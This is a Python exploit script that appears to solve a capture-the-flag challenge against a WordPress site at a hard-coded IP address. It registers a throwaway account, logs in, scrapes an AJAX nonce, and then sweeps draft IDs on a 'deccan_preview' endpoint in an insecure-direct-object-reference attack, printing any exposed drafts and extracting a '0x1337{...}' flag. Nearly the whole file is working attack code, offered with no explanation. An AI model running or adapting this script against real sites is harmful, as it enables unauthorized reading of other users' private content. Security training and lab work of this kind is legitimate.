#!/usr/bin/env python3
import re, sys, time, requests, random, string

B = sys.argv[1] if len(sys.argv) > 1 else "http://40.81.242.56:30755"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "localhost:1337"
u = "deccan" + "".join(random.choices(string.ascii_lowercase, k=6))
email = f"{u}@mail.com"
pw = "LibraryPIN123!"

def db_up():
    r = s.get(B + "/wp-admin/admin-ajax.php?action=nonexist", timeout=15)
    return "database connection" not in r.text

# wait for DB
for _ in range(1):
    if db_up(): break
    print("DB down"); sys.exit(1)

# 1. register
r = s.get(B + "/wp-login.php?action=register", timeout=15)
data = {"user_login": u, "user_email": email, "deccan_pass": pw,
        "wp-submit": "Register", "redirect_to": ""}
# carry any hidden fields
for m in re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', r.text):
    n = re.search(r'name=["\']([^"\']+)', m); v = re.search(r'value=["\']([^"\']*)', m)
    if n and n.group(1) not in data: data[n.group(1)] = v.group(1) if v else ""
r = s.post(B + "/wp-login.php?action=register", data=data, timeout=15)
print("register:", r.status_code, "err" if "registration-error" in r.text.lower() else "ok")

# 2. login
s.cookies.set("wordpress_test_cookie", "WP Cookie check")
r = s.post(B + "/wp-login.php",
           data={"log": u, "pwd": pw, "wp-submit": "Log In",
                 "testcookie": "1", "redirect_to": B + "/library/"},
           timeout=15, allow_redirects=False)
authed = any("wordpress_logged_in" in c.name for c in s.cookies)
print("login authed:", authed)

# 3. grab nonce from /library/
r = s.get(B + "/library/", timeout=15, allow_redirects=False)
m = re.search(r'"nonce":"([a-f0-9]+)"', r.text)
nonce = m.group(1) if m else None
print("nonce:", nonce)

# 4. IDOR sweep
def fetch(i):
    r = s.get(B + "/wp-admin/admin-ajax.php",
              params={"action": "deccan_preview", "nonce": nonce, "id": i}, timeout=15, allow_redirects=False)
    return r.text

for i in range(1, 80):
    t = fetch(i)
    if "0x1337{" in t or (("title" in t or "body" in t) and "forbidden" not in t and "no such draft" not in t):
        print(f"--- id={i} ---")
        print(t[:1500])
        if "0x1337{" in t:
            print("FLAG:", re.search(r'0x1337\{[^}]*\}', t).group(0))
